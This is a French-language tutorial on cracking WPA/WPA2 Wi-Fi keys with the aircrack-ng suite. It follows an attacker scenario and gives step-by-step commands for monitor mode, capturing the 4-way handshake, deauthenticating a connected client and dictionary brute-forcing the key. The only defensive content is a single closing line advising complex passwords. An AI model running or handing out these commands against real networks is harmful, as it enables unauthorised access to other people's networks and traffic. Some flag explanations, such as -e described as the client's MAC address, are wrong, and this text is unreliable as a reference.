# Introduction

L'objectif de cette attaque est de récuperer la clef WPA/WPA2 en réaliser une attaque de type brute-force. Pour cela, il faut récuperer une trame appélée handshake (4-way handshake) qui contient l'echange de clef effectué pour la connection afin de tester une infinité de combinaison en local

L'attque se deroule donc en plusieurs étape
1. Scan des AP
2. Déconnection d'un terminal connecté a l'AP Cible
3. Récuperation du handshake
4. Brute-force


# Faiblesse

Teste des combinaison en brute-force sur une trame récuperer aprés la connection d'un terminal

# Éxploitation

## Scénario
* Jack est le pirate
* Le terminal de Bob est connecté à son AP
* Jack déconnecte le terminal de Bob  à distance
* Le terminal de Bob se reconnecte a l'AP
* Jack ecoute les trames envoyé à l'AP
* Jack récuperer la trame contenant le handshake
* Jack brute-force le handshake jusqu'a l'obtention du mot de passe



# En pratique

## Logiciels
* aircrack-ng : Outil et ensemble d'outils permettant le sniffing de paquets
	* airdump-ng : Surveille les reseaux Wifi
	* airmon-ng  : Activation du mode monitor
	* aireplay-ng : Attaque sur les terminaux
	* aircrack-ng : Capture des paquets


## Attaque

### Activation du mode monitor sur l'interface wifi
```bash
airmon-ng start <interface>
```
Certain programme peuvent bloquer le passage en mode monitor
```bash
airmon-ng check kill
```
Permet de tuer toutes ces application

### Récuperation des information du wifi
```bash
airodump-ng <interface>
```

### Ecoute des trames pour capturer le handshake
```bash
airodump-ng -w out -c 11 -bssid <bssid> <interface>
```
* -w : Fichier de sortie (en .cap)
* -c : Canal a écouter
* -bssid : BSSID (@MAC) de l'AP a écouter

### Deconnexion du terminal connecté a l'AP cible
```bash
aireplay-ng --deauth 5 -e <ESSID> -a <BSSID> --ignore-negation-auth <interface>
```
* -a : cible de l'attaque AP
	* BSSID : @MAC de l'ap
* -e : cible de l'attaque terminal
	* ESSID : @MAC du terminal
* 5 : nombre de paquets

### Brute-force
```bash
aircrack-ng -w dico.txt out01.cap
```
* -w : Fichier de dictionaire
	* -w - : stdin

### Éxecution
* Activation de l'interface en mode monitor
* Ecoute des trame jusqu'a la capture du handshake
* Deconnexion du terminal connecté a l'AP cible
* Quand airdump-ng indique que le handshake est capturé, l'ecoute des trame peut s'arreter
* Brute-force de la clef WPA/WPA2 avec le handshake

## Petit plus
* hashcat : Génerateur de sequence de lettre (à partir d'un motif)
	* Permet de decrypter d'autre type de mot de passe

# Solution
* Mot de passe complexe (Chiffre, Majuscule, Caractere speciaux, ...)
